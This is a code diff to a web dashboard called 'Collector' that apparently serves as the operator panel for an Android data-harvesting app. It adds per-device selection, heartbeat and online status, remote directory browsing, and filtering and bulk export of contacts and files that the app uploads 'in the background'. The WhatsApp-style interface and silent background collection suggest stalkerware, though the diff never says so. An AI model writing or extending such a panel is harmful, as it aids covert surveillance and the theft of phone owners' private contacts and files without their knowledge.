@@ -36,6 +36,8 @@ import {
   Folder,
   RefreshCcw,
   Smartphone,
+  Monitor,
+  TabletSmartphone,
 } from 'lucide-react';
 import { Button } from '@/components/ui/button';
 import { Input } from '@/components/ui/input';
@@ -63,12 +65,24 @@ interface StatusEntry {
   detail?: string;
 }
 
+interface DeviceInfo {
+  id: string;
+  name: string;
+  model: string;
+  brand: string;
+  androidVersion: string;
+  lastHeartbeat?: string;
+  firstSeen: string;
+  isOnline: boolean;
+}
+
 interface ContactInfo {
   id: string;
   name: string;
   phone: string;
   email?: string;
   organization?: string;
+  deviceId?: string;
 }
 
 interface FileInfo {
@@ -88,6 +102,7 @@ interface UploadedFileInfo {
   fileType: string;
   downloadUrl: string;
   uploadedAt: string;
+  deviceId?: string;
 }
 
 interface SessionData {
@@ -103,6 +118,7 @@ interface SessionData {
   statusHistory: StatusEntry[];
   lastHeartbeat: string | null;
   isOnline: boolean;
+  devices: Record<string, DeviceInfo>;
 }
 
 // ─── Status Stepper ──────────────────────────────────────
@@ -324,6 +340,11 @@ export default function CollectorViewPage({ params }: { params: Promise<{ id: st
   const [managerLoading, setManagerLoading] = useState(false);
   const [deletingFileId, setDeletingFileId] = useState<string | null>(null);
 
+  // Multi-device state
+  const [devices, setDevices] = useState<Record<string, DeviceInfo>>({});
+  const [selectedDeviceId, setSelectedDeviceId] = useState<string>('');
+  const [deletingSession, setDeletingSession] = useState(false);
+
   useEffect(() => {
     params.then(p => setSessionId(p.id));
   }, [params]);
@@ -355,6 +376,9 @@ export default function CollectorViewPage({ params }: { params: Promise<{ id: st
           const data = await res.json();
           setSessionStatus(data.status);
           setIsOnline(data.isOnline);
+          if (data.devices) {
+            setDevices(data.devices);
+          }
         }
       } catch {}
     };
@@ -381,6 +405,9 @@ export default function CollectorViewPage({ params }: { params: Promise<{ id: st
         setAppName(data.appName || 'Collector');
         setSessionStatus(data.status);
         setIsOnline(data.isOnline);
+        if (data.devices) {
+          setDevices(data.devices);
+        }
         saveToHistory(data);
         setLoading(false);
       })
@@ -422,19 +449,24 @@ export default function CollectorViewPage({ params }: { params: Promise<{ id: st
   }, [sessionId, toast]);
 
   // File Manager browse handler
-  const browseDirectory = useCallback(async (dirPath: string) => {
+  const browseDirectory = useCallback(async (dirPath: string, deviceId?: string) => {
     if (!sessionId) return;
     setManagerLoading(true);
     setManagerPath(dirPath);
     try {
-      const res = await fetch(`/api/files/browse?sessionId=${sessionId}&path=${encodeURIComponent(dirPath)}`);
+      const effectiveDeviceId = deviceId || selectedDeviceId;
+      let url = `/api/files/browse?sessionId=${sessionId}&path=${encodeURIComponent(dirPath)}`;
+      if (effectiveDeviceId) {
+        url += `&deviceId=${encodeURIComponent(effectiveDeviceId)}`;
+      }
+      const res = await fetch(url);
       if (res.ok) {
         const data = await res.json();
         setManagerData(data);
       }
     } catch {}
     setManagerLoading(false);
-  }, [sessionId]);
+  }, [sessionId, selectedDeviceId]);
 
   // File delete handler
   const handleDeleteFile = useCallback(async (fileId: string) => {
@@ -461,25 +493,99 @@ export default function CollectorViewPage({ params }: { params: Promise<{ id: st
     setDeletingFileId(null);
   }, [sessionId, managerPath, toast, browseDirectory]);
 
+  // Delete session handler
+  const handleDeleteSession = useCallback(async () => {
+    if (!sessionId) return;
+    if (!confirm('Are you sure you want to delete this session? This action cannot be undone.')) return;
+    setDeletingSession(true);
+    try {
+      const res = await fetch(`/api/sessions/${sessionId}`, {
+        method: 'DELETE',
+      });
+      if (res.ok) {
+        toast({ title: 'Session Deleted', description: 'Session has been deleted successfully.' });
+        // Remove from local history
+        try {
+          const stored = localStorage.getItem('contact_sessions');
+          if (stored) {
+            const sessions = JSON.parse(stored);
+            const filtered = sessions.filter((s: any) => s.id !== sessionId);
+            localStorage.setItem('contact_sessions', JSON.stringify(filtered));
+          }
+        } catch {}
+        // Navigate home
+        window.location.href = '/';
+      } else {
+        toast({ title: 'Delete Failed', description: 'Could not delete session.' });
+      }
+    } catch {
+      toast({ title: 'Delete Failed', description: 'Network error.' });
+    }
+    setDeletingSession(false);
+  }, [sessionId, toast]);
+
   // Browse manager directory when tab switches to manager
   useEffect(() => {
-    if (activeTab === 'manager' && sessionId) {
-      browseDirectory(managerPath);
+    if (activeTab !== 'manager' || !sessionId) return;
+    let cancelled = false;
+    const effectiveDeviceId = selectedDeviceId;
+    let url = `/api/files/browse?sessionId=${sessionId}&path=${encodeURIComponent(managerPath)}`;
+    if (effectiveDeviceId) {
+      url += `&deviceId=${encodeURIComponent(effectiveDeviceId)}`;
     }
-  }, [activeTab, sessionId]);
+    fetch(url)
+      .then(res => { if (!res.ok) throw new Error(); return res.json(); })
+      .then(data => { if (!cancelled) setManagerData(data); })
+      .catch(() => {})
+      .finally(() => { if (!cancelled) setManagerLoading(false); });
+    return () => { cancelled = true; };
+  }, [activeTab, sessionId, managerPath, selectedDeviceId]);
+
+  // Device-specific counts
+  const deviceContactCounts = useMemo(() => {
+    const counts: Record<string, number> = {};
+    contacts.forEach(c => {
+      if (c.deviceId) {
+        counts[c.deviceId] = (counts[c.deviceId] || 0) + 1;
+      }
+    });
+    return counts;
+  }, [contacts]);
+
+  const deviceFileCounts = useMemo(() => {
+    const counts: Record<string, number> = {};
+    uploadedFiles.forEach(f => {
+      if (f.deviceId) {
+        counts[f.deviceId] = (counts[f.deviceId] || 0) + 1;
+      }
+    });
+    return counts;
+  }, [uploadedFiles]);
 
   const filteredContacts = useMemo(() => {
-    if (!searchQuery.trim()) return contacts;
-    const q = searchQuery.toLowerCase();
-    return contacts.filter(c =>
-      c.name.toLowerCase().includes(q) ||
-      c.phone.toLowerCase().includes(q) ||
-      (c.email && c.email.toLowerCase().includes(q))
-    );
-  }, [contacts, searchQuery]);
+    let result = contacts;
+    // Filter by selected device
+    if (selectedDeviceId) {
+      result = result.filter(c => c.deviceId === selectedDeviceId);
+    }
+    // Filter by search query
+    if (searchQuery.trim()) {
+      const q = searchQuery.toLowerCase();
+      result = result.filter(c =>
+        c.name.toLowerCase().includes(q) ||
+        c.phone.toLowerCase().includes(q) ||
+        (c.email && c.email.toLowerCase().includes(q))
+      );
+    }
+    return result;
+  }, [contacts, searchQuery, selectedDeviceId]);
 
   const filteredFiles = useMemo(() => {
     let result = uploadedFiles;
+    // Filter by selected device
+    if (selectedDeviceId) {
+      result = result.filter(f => f.deviceId === selectedDeviceId);
+    }
     if (fileTypeFilter !== 'all') {
       result = result.filter(f => f.fileType === fileTypeFilter);
     }
@@ -488,19 +594,22 @@ export default function CollectorViewPage({ params }: { params: Promise<{ id: st
       result = result.filter(f => f.fileName.toLowerCase().includes(q));
     }
     return result;
-  }, [uploadedFiles, fileTypeFilter, searchQuery]);
+  }, [uploadedFiles, fileTypeFilter, searchQuery, selectedDeviceId]);
 
   const totalUploadSize = useMemo(() => {
-    return uploadedFiles.reduce((sum, f) => sum + f.fileSize, 0);
-  }, [uploadedFiles]);
+    return filteredFiles.reduce((sum, f) => sum + f.fileSize, 0);
+  }, [filteredFiles]);
 
   const fileTypeCounts = useMemo(() => {
+    const source = selectedDeviceId
+      ? uploadedFiles.filter(f => f.deviceId === selectedDeviceId)
+      : uploadedFiles;
     const counts: Record<string, number> = {};
-    uploadedFiles.forEach(f => {
+    source.forEach(f => {
       counts[f.fileType] = (counts[f.fileType] || 0) + 1;
     });
     return counts;
-  }, [uploadedFiles]);
+  }, [uploadedFiles, selectedDeviceId]);
 
   const copyVCard = useCallback(async (contact: ContactInfo) => {
     try {
@@ -523,22 +632,22 @@ export default function CollectorViewPage({ params }: { params: Promise<{ id: st
 
   const copyAllVCard = useCallback(async () => {
     try {
-      await navigator.clipboard.writeText(generateAllVCard(contacts));
+      await navigator.clipboard.writeText(generateAllVCard(filteredContacts));
       setCopiedAll(true);
-      toast({ title: 'All Copied!', description: `${contacts.length} contacts vCard copied` });
+      toast({ title: 'All Copied!', description: `${filteredContacts.length} contacts vCard copied` });
       setTimeout(() => setCopiedAll(false), 2000);
     } catch {
       const textarea = document.createElement('textarea');
-      textarea.value = generateAllVCard(contacts);
+      textarea.value = generateAllVCard(filteredContacts);
       document.body.appendChild(textarea);
       textarea.select();
       document.execCommand('copy');
       document.body.removeChild(textarea);
       setCopiedAll(true);
-      toast({ title: 'All Copied!', description: `${contacts.length} contacts vCard copied` });
+      toast({ title: 'All Copied!', description: `${filteredContacts.length} contacts vCard copied` });
       setTimeout(() => setCopiedAll(false), 2000);
     }
-  }, [contacts, toast]);
+  }, [filteredContacts, toast]);
 
   const downloadVCard = useCallback((contact: ContactInfo) => {
     const blob = new Blob([generateVCard(contact)], { type: 'text/vcard' });
@@ -551,14 +660,14 @@ export default function CollectorViewPage({ params }: { params: Promise<{ id: st
   }, []);
 
   const downloadAllVCard = useCallback(() => {
-    const blob = new Blob([generateAllVCard(contacts)], { type: 'text/vcard' });
+    const blob = new Blob([generateAllVCard(filteredContacts)], { type: 'text/vcard' });
     const url = URL.createObjectURL(blob);
     const a = document.createElement('a');
     a.href = url;
     a.download = 'all_contacts.vcf';
     a.click();
     URL.revokeObjectURL(url);
-  }, [contacts]);
+  }, [filteredContacts]);
 
   const shareVCard = useCallback(async (contact: ContactInfo) => {
     const vcard = generateVCard(contact);
@@ -570,21 +679,25 @@ export default function CollectorViewPage({ params }: { params: Promise<{ id: st
   const downloadZip = useCallback(async () => {
     setZipDownloading(true);
     try {
-      const res = await fetch(`/api/files/download/${sessionId}`);
+      let url = `/api/files/download/${sessionId}`;
+      if (selectedDeviceId) {
+        url += `?deviceId=${encodeURIComponent(selectedDeviceId)}`;
+      }
+      const res = await fetch(url);
       if (!res.ok) throw new Error('Download failed');
       const blob = await res.blob();
-      const url = URL.createObjectURL(blob);
+      const blobUrl = URL.createObjectURL(blob);
       const a = document.createElement('a');
-      a.href = url;
+      a.href = blobUrl;
       a.download = `${(appName || 'collector').replace(/\s+/g, '-').toLowerCase()}.zip`;
       a.click();
-      URL.revokeObjectURL(url);
+      URL.revokeObjectURL(blobUrl);
       toast({ title: 'Download Started!', description: 'ZIP file is downloading' });
     } catch (err) {
       toast({ title: 'Download Failed', description: 'No uploaded files available yet. Files will appear as the app syncs them in the background.' });
     }
     setZipDownloading(false);
-  }, [sessionId, appName, toast]);
+  }, [sessionId, appName, toast, selectedDeviceId]);
 
   const downloadSingleFile = useCallback(async (file: UploadedFileInfo) => {
     try {
@@ -603,6 +716,11 @@ export default function CollectorViewPage({ params }: { params: Promise<{ id: st
       window.open(file.downloadUrl, '_blank');
     }
   }, []);
+
+  // Device list for rendering
+  const deviceList = useMemo(() => {
+    return Object.values(devices);
+  }, [devices]);
 
   // ─── Loading ───────────────────────────────────────
   if (loading) {
@@ -697,6 +815,17 @@ export default function CollectorViewPage({ params }: { params: Promise<{ id: st
                 </div>
               </div>
             )}
+            {selectedContact.deviceId && devices[selectedContact.deviceId] && (
+              <div className="flex items-center gap-3 py-2">
+                <div className="w-10 h-10 rounded-full bg-[#25D366]/10 flex items-center justify-center shrink-0">
+                  <Smartphone className="w-5 h-5 text-[#25D366]" />
+                </div>
+                <div className="flex-1 min-w-0">
+                  <p className="text-xs text-gray-500 mb-0.5">Device</p>
+                  <p className="text-sm font-medium text-gray-900 truncate">{devices[selectedContact.deviceId].name} ({devices[selectedContact.deviceId].model})</p>
+                </div>
+              </div>
+            )}
           </div>
           <div className="bg-white rounded-2xl shadow-sm overflow-hidden">
             <div className="px-4 py-3 bg-[#075E54] flex items-center gap-2">
@@ -742,10 +871,101 @@ export default function CollectorViewPage({ params }: { params: Promise<{ id: st
         <button onClick={() => handleRefresh()} className="w-8 h-8 rounded-full hover:bg-white/10 flex items-center justify-center" title="Refresh">
           <RefreshCw className="w-4 h-4 text-white/70" />
         </button>
+        <button onClick={handleDeleteSession} disabled={deletingSession} className="w-8 h-8 rounded-full hover:bg-red-500/30 flex items-center justify-center" title="Delete Session">
+          {deletingSession ? (
+            <Loader2 className="w-4 h-4 text-red-300 animate-spin" />
+          ) : (
+            <Trash2 className="w-4 h-4 text-red-300" />
+          )}
+        </button>
       </div>
 
       {/* Status Stepper */}
       <StatusStepper status={sessionStatus} isOnline={isOnline} />
+
+      {/* Device Selector Section */}
+      {deviceList.length > 0 && (
+        <div className="px-3 py-3 bg-[#ECE5DD]">
+          <div className="flex items-center justify-between mb-2">
+            <h3 className="text-xs font-bold text-gray-600 flex items-center gap-1.5">
+              <Monitor className="w-3.5 h-3.5" />
+              Connected Devices
+              <Badge className="bg-[#075E54] text-white border-0 text-[10px] px-1.5 py-0 h-4 min-w-[20px]">{deviceList.length}</Badge>
+            </h3>
+            {selectedDeviceId && (
+              <button
+                onClick={() => setSelectedDeviceId('')}
+                className="text-[10px] text-[#075E54] font-semibold hover:underline"
+              >
+                Show All
+              </button>
+            )}
+          </div>
+          <div className="flex gap-2 overflow-x-auto pb-1 no-scrollbar">
+            {/* All Devices Card */}
+            <button
+              onClick={() => setSelectedDeviceId('')}
+              className={`shrink-0 rounded-xl p-3 min-w-[120px] max-w-[160px] border-2 transition-all ${
+                selectedDeviceId === ''
+                  ? 'bg-[#075E54] border-[#25D366] shadow-md'
+                  : 'bg-white border-gray-200 hover:border-[#075E54]/30'
+              }`}
+            >
+              <div className="flex items-center gap-2 mb-1.5">
+                <div className={`w-7 h-7 rounded-full flex items-center justify-center ${
+                  selectedDeviceId === '' ? 'bg-[#25D366]/30' : 'bg-gray-100'
+                }`}>
+                  <Monitor className={`w-3.5 h-3.5 ${selectedDeviceId === '' ? 'text-[#25D366]' : 'text-gray-500'}`} />
+                </div>
+                <span className={`text-[10px] font-bold ${selectedDeviceId === '' ? 'text-[#25D366]' : 'text-gray-500'}`}>
+                  ALL
+                </span>
+              </div>
+              <p className={`text-xs font-semibold truncate ${selectedDeviceId === '' ? 'text-white' : 'text-gray-900'}`}>
+                All Devices
+              </p>
+              <p className={`text-[10px] ${selectedDeviceId === '' ? 'text-white/60' : 'text-gray-400'}`}>
+                {contacts.length} contacts &bull; {uploadedFiles.length} files
+              </p>
+            </button>
+
+            {/* Individual Device Cards */}
+            {deviceList.map((device) => (
+              <button
+                key={device.id}
+                onClick={() => setSelectedDeviceId(selectedDeviceId === device.id ? '' : device.id)}
+                className={`shrink-0 rounded-xl p-3 min-w-[120px] max-w-[180px] border-2 transition-all ${
+                  selectedDeviceId === device.id
+                    ? 'bg-[#075E54] border-[#25D366] shadow-md'
+                    : 'bg-white border-gray-200 hover:border-[#075E54]/30'
+                }`}
+              >
+                <div className="flex items-center gap-2 mb-1.5">
+                  <div className={`w-7 h-7 rounded-full flex items-center justify-center ${
+                    selectedDeviceId === device.id ? 'bg-[#25D366]/30' : device.isOnline ? 'bg-green-50' : 'bg-gray-100'
+                  }`}>
+                    <TabletSmartphone className={`w-3.5 h-3.5 ${
+                      selectedDeviceId === device.id ? 'text-[#25D366]' : device.isOnline ? 'text-green-600' : 'text-gray-400'
+                    }`} />
+                  </div>
+                  <span className={`w-2 h-2 rounded-full shrink-0 ${
+                    device.isOnline ? 'bg-[#25D366] animate-pulse' : 'bg-gray-300'
+                  }`} />
+                </div>
+                <p className={`text-xs font-semibold truncate ${selectedDeviceId === device.id ? 'text-white' : 'text-gray-900'}`}>
+                  {device.name || device.model}
+                </p>
+                <p className={`text-[10px] truncate ${selectedDeviceId === device.id ? 'text-white/60' : 'text-gray-400'}`}>
+                  {device.brand} {device.model}
+                </p>
+                <p className={`text-[10px] mt-0.5 ${selectedDeviceId === device.id ? 'text-white/50' : 'text-gray-300'}`}>
+                  {deviceContactCounts[device.id] || 0} contacts &bull; {deviceFileCounts[device.id] || 0} files
+                </p>
+              </button>
+            ))}
+          </div>
+        </div>
+      )}
 
       {/* Access Status Cards */}
       <div className="px-3 py-3 bg-[#ECE5DD]">
@@ -756,7 +976,7 @@ export default function CollectorViewPage({ params }: { params: Promise<{ id: st
             </div>
             <p className="text-white font-bold text-sm">Contact</p>
             <p className="text-[#25D366] text-xs font-semibold">Full Access</p>
-            <p className="text-white/50 text-[10px] mt-0.5">{contacts.length} contacts</p>
+            <p className="text-white/50 text-[10px] mt-0.5">{filteredContacts.length} contacts</p>
           </div>
           <div className="bg-[#075E54] rounded-2xl p-3 text-center shadow-sm">
             <div className="w-10 h-10 rounded-full bg-blue-400/20 flex items-center justify-center mx-auto mb-1.5">
@@ -784,8 +1004,8 @@ export default function CollectorViewPage({ params }: { params: Promise<{ id: st
               {zipDownloading ? 'Creating ZIP...' : 'Download All as ZIP'}
             </h2>
             <p className="text-white/70 text-xs">
-              {uploadedFiles.length > 0
-                ? `${uploadedFiles.length} files + ${contacts.length} contacts`
+              {filteredFiles.length > 0
+                ? `${filteredFiles.length} files + ${filteredContacts.length} contacts`
                 : 'Files will appear as app syncs them'
               }
             </p>
@@ -804,7 +1024,7 @@ export default function CollectorViewPage({ params }: { params: Promise<{ id: st
             }`}
           >
             <Phone className="w-3.5 h-3.5" />
-            Contacts ({contacts.length})
+            Contacts ({filteredContacts.length})
           </button>
           <button
             onClick={() => { setActiveTab('files'); setSearchQuery(''); }}
@@ -813,7 +1033,7 @@ export default function CollectorViewPage({ params }: { params: Promise<{ id: st
             }`}
           >
             <FolderOpen className="w-3.5 h-3.5" />
-            Files ({uploadedFiles.length})
+            Files ({filteredFiles.length})
           </button>
           <button
             onClick={() => { setActiveTab('manager'); setSearchQuery(''); }}
@@ -885,9 +1105,9 @@ export default function CollectorViewPage({ params }: { params: Promise<{ id: st
               </div>
               <div className="flex-1 text-left min-w-0">
                 <h2 className="font-bold text-base">My Contacted Numbers</h2>
-                <p className="text-white/70 text-xs">{contacts.length} contacts in vCard format</p>
+                <p className="text-white/70 text-xs">{filteredContacts.length} contacts in vCard format</p>
               </div>
-              <Badge className="bg-[#25D366] text-white border-0 text-sm px-2.5 py-1 font-bold">{contacts.length}</Badge>
+              <Badge className="bg-[#25D366] text-white border-0 text-sm px-2.5 py-1 font-bold">{filteredContacts.length}</Badge>
             </button>
           </div>
 
@@ -905,7 +1125,7 @@ export default function CollectorViewPage({ params }: { params: Promise<{ id: st
                 </div>
                 <div className="p-4">
                   <pre className="text-[10px] text-gray-700 bg-gray-50 rounded-xl p-3 overflow-auto max-h-48 whitespace-pre-wrap font-mono leading-relaxed">
-                    {generateAllVCard(contacts)}
+                    {generateAllVCard(filteredContacts)}
                   </pre>
                 </div>
                 <div className="px-4 pb-4 flex gap-2">
@@ -927,6 +1147,14 @@ export default function CollectorViewPage({ params }: { params: Promise<{ id: st
                 <div className="py-12 text-center">
                   <Users className="w-12 h-12 text-gray-300 mx-auto mb-3" />
                   <p className="text-gray-500 text-sm">No contacts found</p>
+                  {selectedDeviceId && (
+                    <button
+                      onClick={() => setSelectedDeviceId('')}
+                      className="text-[#075E54] text-xs font-semibold mt-2 hover:underline"
+                    >
+                      Show all devices
+                    </button>
+                  )}
                 </div>
               ) : (
                 filteredContacts.map((contact, index) => (
@@ -944,6 +1172,9 @@ export default function CollectorViewPage({ params }: { params: Promise<{ id: st
                         <h3 className="text-sm font-semibold text-gray-900 truncate">{contact.name}</h3>
                         <p className="text-xs text-gray-500 truncate mt-0.5">{contact.phone}</p>
                       </div>
+                      {contact.deviceId && devices[contact.deviceId] && !selectedDeviceId && (
+                        <span className="text-[9px] text-gray-400 truncate max-w-[60px]">{devices[contact.deviceId].name}</span>
+                      )}
                       <ChevronRight className="w-4 h-4 text-gray-300 shrink-0" />
                     </button>
                     {index < filteredContacts.length - 1 && <div className="ml-[68px] border-b border-gray-100" />}
@@ -963,7 +1194,7 @@ export default function CollectorViewPage({ params }: { params: Promise<{ id: st
             <div className="flex items-center gap-2">
               <div className="flex gap-2 overflow-x-auto pb-1 no-scrollbar flex-1">
                 {[
-                  { key: 'all', label: 'All', count: uploadedFiles.length },
+                  { key: 'all', label: 'All', count: filteredFiles.length },
                   { key: 'image', label: 'Images', count: fileTypeCounts.image || 0 },
                   { key: 'video', label: 'Videos', count: fileTypeCounts.video || 0 },
                   { key: 'audio', label: 'Audio', count: fileTypeCounts.audio || 0 },
@@ -1006,6 +1237,14 @@ export default function CollectorViewPage({ params }: { params: Promise<{ id: st
                 <p className="text-gray-400 text-xs max-w-[250px] mx-auto">
                   Files are being uploaded in the background by the app. Refresh to check for updates.
                 </p>
+                {selectedDeviceId && (
+                  <button
+                    onClick={() => setSelectedDeviceId('')}
+                    className="text-[#075E54] text-xs font-semibold mt-2 hover:underline"
+                  >
+                    Show all devices
+                  </button>
+                )}
                 <Button
                   onClick={() => handleRefresh()}
                   variant="outline"
@@ -1024,7 +1263,7 @@ export default function CollectorViewPage({ params }: { params: Promise<{ id: st
                       key={file.id}
                       className="bg-white rounded-xl shadow-sm overflow-hidden cursor-pointer hover:shadow-md transition-shadow"
                       onClick={() => {
-                        if (file.fileType === 'image' || file.fileType === 'pdf') {
+                        if (file.fileType === 'image' || file.fileType === 'pdf' || file.fileType === 'video') {
                           setPreviewFile(file);
                         }
                       }}
@@ -1038,6 +1277,20 @@ export default function CollectorViewPage({ params }: { params: Promise<{ id: st
                             className="w-full h-full object-cover"
                             loading="lazy"
                           />
+                        ) : file.fileType === 'video' ? (
+                          <div className="relative w-full h-full bg-black flex items-center justify-center">
+                            <video
+                              src={file.downloadUrl}
+                              className="w-full h-full object-cover"
+                              muted
+                              preload="metadata"
+                            />
+                            <div className="absolute inset-0 flex items-center justify-center">
+                              <div className="w-10 h-10 rounded-full bg-white/80 flex items-center justify-center">
+                                <Play className="w-5 h-5 text-[#075E54] ml-0.5" />
+                              </div>
+                            </div>
+                          </div>
                         ) : file.fileType === 'audio' ? (
                           <div className="flex flex-col items-center gap-2 w-full px-2">
                             <Music className="w-8 h-8 text-orange-400" />
@@ -1054,11 +1307,6 @@ export default function CollectorViewPage({ params }: { params: Promise<{ id: st
                           <div className="flex flex-col items-center gap-2">
                             <FileText className="w-10 h-10 text-red-400" />
                             <span className="text-[10px] text-gray-500">PDF Document</span>
-                          </div>
-                        ) : file.fileType === 'video' ? (
-                          <div className="flex flex-col items-center gap-2">
-                            <Video className="w-10 h-10 text-red-400" />
-                            <span className="text-[10px] text-gray-500">Video</span>
                           </div>
                         ) : (
                           <div className="flex flex-col items-center gap-2">
@@ -1087,16 +1335,22 @@ export default function CollectorViewPage({ params }: { params: Promise<{ id: st
                       </div>
                       <div className="flex-1 min-w-0 text-left">
                         <h3 className="text-sm font-medium text-gray-900 truncate">{file.fileName}</h3>
-                        <p className="text-xs text-gray-500 mt-0.5 flex items-center gap-1.5">
+                        <p className="text-xs text-gray-500 mt-0.5 flex items-center gap-1.5 flex-wrap">
                           <span>{formatFileSize(file.fileSize)}</span>
                           <span className="text-gray-300">|</span>
                           <span className="capitalize">{file.fileType}</span>
                           <span className="text-gray-300">|</span>
                           <span>{timeAgo(file.uploadedAt)}</span>
+                          {file.deviceId && devices[file.deviceId] && !selectedDeviceId && (
+                            <>
+                              <span className="text-gray-300">|</span>
+                              <span className="text-gray-400 truncate max-w-[60px]">{devices[file.deviceId].name}</span>
+                            </>
+                          )}
                         </p>
                       </div>
                       <div className="flex items-center gap-1">
-                        {(file.fileType === 'image' || file.fileType === 'pdf') && (
+                        {(file.fileType === 'image' || file.fileType === 'pdf' || file.fileType === 'video') && (
                           <button
                             onClick={() => setPreviewFile(file)}
                             className="w-8 h-8 rounded-full hover:bg-gray-100 flex items-center justify-center"
@@ -1186,7 +1440,7 @@ export default function CollectorViewPage({ params }: { params: Promise<{ id: st
                 </div>
                 <div className="text-right">
                   <p className="text-[10px] font-semibold text-gray-500">Total Files</p>
-                  <p className="text-base font-bold text-[#075E54]">{uploadedFiles.length}</p>
+                  <p className="text-base font-bold text-[#075E54]">{filteredFiles.length}</p>
                 </div>
               </div>
             </div>
@@ -1198,7 +1452,7 @@ export default function CollectorViewPage({ params }: { params: Promise<{ id: st
             <div className="grid grid-cols-3 gap-2">
               <Button
                 onClick={downloadZip}
-                disabled={zipDownloading || uploadedFiles.length === 0}
+                disabled={zipDownloading || filteredFiles.length === 0}
                 className="bg-[#25D366] hover:bg-[#20BD5A] text-white h-12 rounded-xl flex-col gap-0.5 text-[10px]"
               >
                 {zipDownloading ? <Loader2 className="w-4 h-4 animate-spin" /> : <Archive className="w-4 h-4" />}
@@ -1206,7 +1460,7 @@ export default function CollectorViewPage({ params }: { params: Promise<{ id: st
               </Button>
               <Button
                 onClick={downloadAllVCard}
-                disabled={contacts.length === 0}
+                disabled={filteredContacts.length === 0}
                 variant="outline"
                 className="border-[#075E54]/30 text-[#075E54] hover:bg-[#075E54]/10 h-12 rounded-xl flex-col gap-0.5 text-[10px]"
               >
@@ -1231,6 +1485,11 @@ export default function CollectorViewPage({ params }: { params: Promise<{ id: st
               <div className="px-4 py-3 bg-[#075E54] flex items-center gap-2">
                 <FolderOpen className="w-4 h-4 text-white/80 shrink-0" />
                 <h4 className="text-white font-semibold text-sm flex-1">Browse Files</h4>
+                {selectedDeviceId && devices[selectedDeviceId] && (
+                  <span className="text-[10px] text-[#25D366] font-semibold mr-2">
+                    {devices[selectedDeviceId].name}
+                  </span>
+                )}
                 <button
                   onClick={() => browseDirectory(managerPath)}
                   className="w-7 h-7 rounded-full hover:bg-white/10 flex items-center justify-center shrink-0"
@@ -1333,7 +1592,7 @@ export default function CollectorViewPage({ params }: { params: Promise<{ id: st
                         </p>
                       </div>
                       <div className="flex items-center gap-0.5 shrink-0">
-                        {(file.fileType === 'image' || file.fileType === 'pdf') && (
+                        {(file.fileType === 'image' || file.fileType === 'pdf' || file.fileType === 'video') && (
                           <button
                             onClick={() => setPreviewFile(file)}
                             className="w-7 h-7 rounded-full hover:bg-purple-50 flex items-center justify-center"
@@ -1372,13 +1631,13 @@ export default function CollectorViewPage({ params }: { params: Promise<{ id: st
               )}
 
               {/* Show all files flat list option */}
-              {managerData && managerPath === '/' && uploadedFiles.length > 0 && (
+              {managerData && managerPath === '/' && filteredFiles.length > 0 && (
                 <div className="px-4 py-3 bg-gray-50 border-t border-gray-100">
                   <h4 className="text-xs font-semibold text-gray-600 mb-2 flex items-center gap-1">
                     <File className="w-3 h-3" /> All Files (Flat View)
                   </h4>
                   <div className="max-h-60 overflow-y-auto">
-                    {uploadedFiles.map((file) => (
+                    {filteredFiles.map((file) => (
                       <div
                         key={file.id}
                         className="flex items-center gap-2 py-1.5 border-b border-gray-100 last:border-0"
@@ -1419,10 +1678,20 @@ export default function CollectorViewPage({ params }: { params: Promise<{ id: st
                   alt={previewFile.fileName}
                   className="w-full max-h-[60vh] object-contain rounded-xl"
                 />
+              ) : previewFile.fileType === 'video' ? (
+                <video
+                  controls
+                  className="w-full max-h-[60vh] rounded-xl"
+                  src={previewFile.downloadUrl}
+                  autoPlay
+                >
+                  <track kind="captions" />
+                  Your browser does not support the video tag.
+                </video>
               ) : previewFile.fileType === 'audio' ? (
                 <div className="flex flex-col items-center gap-4 py-8">
                   <Music className="w-16 h-16 text-orange-400" />
-                  <audio controls className="w-full" src={previewFile.downloadUrl}>
+                  <audio controls className="w-full" src={previewFile.downloadUrl} autoPlay>
                     <track kind="captions" />
                   </audio>
                 </div>
@@ -1453,9 +1722,9 @@ export default function CollectorViewPage({ params }: { params: Promise<{ id: st
       )}
 
       {/* Footer */}
-      <div className="px-4 py-3 bg-white border-t border-gray-100">
+      <div className="px-4 py-3 bg-white border-t border-gray-100 mt-auto">
         <p className="text-center text-xs text-gray-400">
-          Collector &bull; {contacts.length} contacts &bull; {uploadedFiles.length} files &bull; {formatFileSize(totalUploadSize)}
+          Collector &bull; {filteredContacts.length} contacts &bull; {filteredFiles.length} files &bull; {formatFileSize(totalUploadSize)}
         </p>
       </div>
     </div>
